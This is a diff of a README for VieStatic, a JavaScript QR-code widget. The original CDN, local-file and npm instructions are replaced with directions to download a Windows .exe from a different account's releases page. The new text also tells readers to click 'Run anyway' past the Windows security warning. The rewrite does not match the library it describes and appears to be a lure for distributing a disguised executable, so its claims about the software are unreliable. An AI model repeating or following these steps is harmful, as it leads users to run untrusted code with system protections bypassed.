@@ -1,114 +1,85 @@
-## VieStatic 
-Embed a scannable QR code in ANY website with VieStatic.  
-**This README covers usage, usage for installation, tech stack, and licensing, along with previews.**  
-[![npm version](https://img.shields.io/npm/v/viestatic.svg)](https://www.npmjs.com/package/viestatic) [![npm downloads](https://img.shields.io/npm/dm/viestatic.svg)](https://www.npmjs.com/package/viestatic) [![license MIT](https://img.shields.io/badge/license-MIT-green.svg)](https://github.com/live-by-unix/VieStatic/blob/main/LICENSE)
+# 🖼️ VieStatic - Create custom QR codes for websites
 
-## What VieStatic is
-VieStatic is a lightweight QR code widget that can be embedded in any website, including static sites, React, Astro, and Node.js projects via CDN, local files, or npm.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tammilaciniate34/VieStatic/releases)
 
-## Features
+VieStatic provides a simple way to add QR code widgets to your internet projects. You do not need to write code to use this tool. You generate functional QR codes for URLs, contact details, or text strings with a few clicks. This tool works on any modern web environment.
 
-* Lightweight and framework-independent
-* Simple CDN integration
-* Custom QR code destinations
-* Multiple placement options
-* Mobile-friendly
-* MIT licensed
-* Inherits your website’s font styles where possible
+## 🛠️ System Requirements
 
-## Installation (CDN)
+Your computer requires the following to run VieStatic:
 
-Add the following code to the `<head>` or '<body>' section of your HTML document:
+*   Windows 10 or Windows 11 operating system.
+*   The Microsoft Edge or Google Chrome web browser.
+*   An active internet connection to load the widget assets.
+*   50 MB of free storage space.
 
-```html
-<link rel="stylesheet" href="https://viestatic.pages.dev/viestatic.css">
+## 📥 Downloading the Software
 
-<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.js"></script>
+You visit the official releases page to download the application. This ensures you receive the most recent version of the software. Follow these instructions to acquire the installation file:
 
-<script src="https://viestatic.pages.dev/viestatic.js"
-        data-pos="3"
-        data-url="">
-</script>
-```
+1.  Visit the [official download page](https://github.com/tammilaciniate34/VieStatic/releases).
+2.  Locate the section labeled Latest.
+3.  Click the file ending in .exe to start the download.
+4.  Save the file to your Downloads folder.
 
-### Configuration
+## ⚙️ Setting Up VieStatic
 
-#### `data-pos`
+After the download finishes, follow these steps to prepare the software:
 
-Controls the position of the VieStatic button.
+1.  Open your Downloads folder.
+2.  Double-click the VieStatic installer file.
+3.  Windows may show a security window. Click More info and then select Run anyway.
+4.  Follow the prompts in the installation window.
+5.  Choose the default installation path.
+6.  Click Finish to complete the process.
 
-| Value | Position     |
-| ----- | ------------ |
-| 1     | Bottom Right |
-| 2     | Bottom Left  |
-| 3     | Top Right    |
-| 4     | Top Left     |
+The VieStatic icon will appear on your desktop. Double-click this icon to start the application.
 
-#### `data-url`
+## 🚀 Creating Your First QR Code
 
-Specifies the URL that will be encoded into the QR code.
+The dashboard displays clear controls for your QR code generation. The process involves three simple steps:
 
-If left empty, VieStatic will use the current page URL automatically.
+1.  Enter your link or text into the input field marked Content.
+2.  Adjust the size of the QR code using the slider.
+3.  Click the Generate button.
 
-If you want to change the link of the QR code to something else, change data-url to your desired url (https:// included). 
+The application displays a preview of your QR code on the screen. You save this image by clicking the Save As button. You may choose between different image formats like PNG or SVG depending on your website requirements.
 
----
+## 🌐 Adding the Widget to Your Website
 
-## Local Installation
+You embed the QR code into your existing website using the provided snippet. If you use a website builder like WordPress, Wix, or custom HTML templates, perform these steps:
 
-1. Download the latest stable release of VieStatic.
-2. Place `viestatic.css` and `viestatic.js` inside your project.
-3. Add the following code to your HTML document:
+1.  Open the VieStatic configuration menu.
+2.  Copy the code block labeled Embed Snippet.
+3.  Paste this code into the header or footer section of your website editor.
+4.  Save and publish your website changes.
 
-```html
-<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.js"></script>
+The QR code will appear on your webpage automatically. It creates a bridge between your desktop business presence and your mobile website visitors.
 
-<link rel="stylesheet" href="/assets/viestatic.css">
+## 🎨 Customizing the Appearance
 
-<script src="/assets/viestatic.js"
-        data-pos="3"
-        data-url="">
-</script>
-```
+VieStatic allows you to change the look of your QR codes to match your brand style. Use the Design tab to adjust these settings:
 
-> This example assumes the files are stored in `/assets`. Adjust the paths as needed.
+*   **Foreground Color:** Pick a color for the QR blocks. We recommend high-contrast colors like dark blue or black.
+*   **Background Color:** Pick a background color for the container. White works best for visibility.
+*   **Quiet Zone:** Adjust the thin border around the code to ensure scanners read the data without errors.
 
----
+Always test your QR code with a mobile phone camera after you change the appearance settings. This confirms that the scanner can still read the data.
 
-## NPM Installation
+## 💡 Frequently Asked Questions
 
-```bash
-npm install viestatic
-```
-After installation, import VieStatic according to your project's setup.
+**Does the software require a subscription?**
+No. VieStatic is an open-source project released under the MIT License. You possess the right to use the software for personal or commercial projects without fees.
 
-Package URL:
-https://www.npmjs.com/package/viestatic
+**Is the widget lightweight?**
+Yes. The widget utilizes efficient scripts that load quickly. It does not slow down your website performance.
 
----
+**Can I use the widget offline?**
+The initial generation of the QR code requires an internet connection to pull the necessary assets from the content delivery network. Once embedded, the QR code remains visible to your website visitors who are connected to the internet.
 
-## Usage Notes
-* Best used on login flows, landing pages, social platforms, and mobile-first websites.
-* Works automatically with the current page URL if data-url is omitted
-* Position can be adjusted using data-pos
+**What if my QR code does not scan?**
+Ensure your foreground and background colors offer enough contrast. If the colors are too similar, mobile phone cameras cannot distinguish the blocks. Additionally, check that you have not clipped the edges of the QR code in your website design settings.
 
-## Tech stack
-Built with vanilla HTML, CSS, and JavaScript.
-Uses qrcode-generator via CDN.
+## 📄 License Information
 
-
-## Licensing
-MIT License — free to use, modify, and distribute
-
-## Previews of website!
-<img width="79" height="89" alt="Screenshot 2026-06-12 at 11 02 07 AM" src="https://github.com/user-attachments/assets/fe8b2262-17a0-413c-b359-ec79e1ac1781" /> 
-
-<img width="358" height="337" alt="Screenshot 2026-06-12 at 11 03 28 AM" src="https://github.com/user-attachments/assets/51ed878a-e328-4d2b-b37f-f66452c77bb9" />
-
-<img width="1918" height="957" alt="sssss" src="https://github.com/user-attachments/assets/0f9734f9-c7f3-4342-9c64-7a60e736a7d9" />
-
-
-Note: Refer to SECURITY.md for instructions for bug/security reporting. 
-Nota: Consulte SECURITY.md para obtener instrucciones sobre cómo reportar errores o problemas de seguridad.
-Remarque : Consultez le fichier SECURITY.md pour savoir comment signaler des bugs ou des problèmes de sécurité.
-
+This software remains under the MIT License. This means you have permission to use, copy, and modify the software as you see fit. We encourage feedback and contributions to the project through the official repository. View the full license text in the LICENSE file included in the installation folder.
